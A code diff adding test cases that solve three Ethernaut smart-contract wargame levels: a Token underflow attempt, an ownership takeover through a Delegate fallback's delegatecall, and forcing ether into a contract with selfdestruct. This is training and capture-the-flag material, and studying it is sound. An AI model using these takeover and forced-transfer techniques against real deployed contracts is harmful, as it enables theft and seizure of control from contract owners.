@@ -61,4 +61,32 @@ describe("Ethernaut", function () {
 			expect(hacker).to.equal(ownerCurrent, "Failed to pass level 4."); // become the owner to pass the level
 		});
 	});
+
+	describe("Level 5 - Token", async () => {
+		it("Exploit", async () => {
+			const contract = await ethers.deployContract("Token", [amount], { from: owner });
+			await expect(contract.connect(owner).transfer(user, amount + BigInt("1"))).to.be.reverted; // cause an integer underflow to pass the level | solidity v0.8.0+ is immune to underflows and overflows and will revert any such transaction
+		});
+	});
+
+	describe("Level 6 - Delegate", async () => {
+		it("Exploit", async () => {
+			const contract = await ethers.deployContract("Delegate", [owner]);
+			await hacker.sendTransaction({ from: hacker, to: contract, data: ethers.keccak256(ethers.toUtf8Bytes("pwn()")) }) // trigger the fallback() function to set the hacker as the new owner
+			const ownerCurrent = await contract.owner();
+			expect(hacker).to.equal(ownerCurrent, "Failed to pass level 6."); // become the owner to pass the level
+		});
+	});
+
+	describe("Level 7 - Force", async () => {
+		it("Exploit", async () => {
+			const contract = await ethers.deployContract("Force");
+			const exploit = await ethers.deployContract("ForceExploit");
+			const balanceOld = await ethers.provider.getBalance(contract);
+			await hacker.sendTransaction({ from: hacker, to: exploit, value: amount }); // send some balance to the exploit contract using the receive() function
+			await exploit.run(contract); // forcefully send all the balance from the exploit contract to the target contract using selfdestruct() function			
+			const balanceNew = await ethers.provider.getBalance(contract);
+			assert(balanceNew > balanceOld, "Failed to pass level 7."); // make the target's contract balance greater than zero to pass the level
+		});
+	});
 });
